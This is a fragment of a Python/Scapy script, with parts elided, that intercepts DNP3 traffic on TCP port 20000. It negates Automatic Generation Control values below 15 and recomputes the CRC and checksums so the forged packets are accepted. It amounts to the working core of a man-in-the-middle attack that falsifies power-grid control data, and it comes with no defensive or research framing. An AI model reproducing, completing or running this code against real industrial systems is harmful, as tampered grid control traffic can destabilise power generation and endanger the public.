		...
		if(pkt[TCP].sport==20000 or pkt[TCP].dport==20000):
			...
			if(len(payload)>=21):
				if(payload[12] == '\x05'):
					...
					if(value < 15 and value != 0.0):
						#block = True
						print "Flipping AGC packet with value: "+str(value)
						value = value * -1
						print "New AGC value: "+str(value)
						value = float_to_hex(value)
						crc = '\x00\x00'
						pkt[Raw].load = payload[:18]+value+payload[22]+crc
						crc1 = calc_crc_chksum(pkt[Raw].load[10:23])
						pkt[Raw].load = payload[:18]+value+payload[22]+crc1
						del pkt[IP].chksum
						del pkt[TCP].chksum
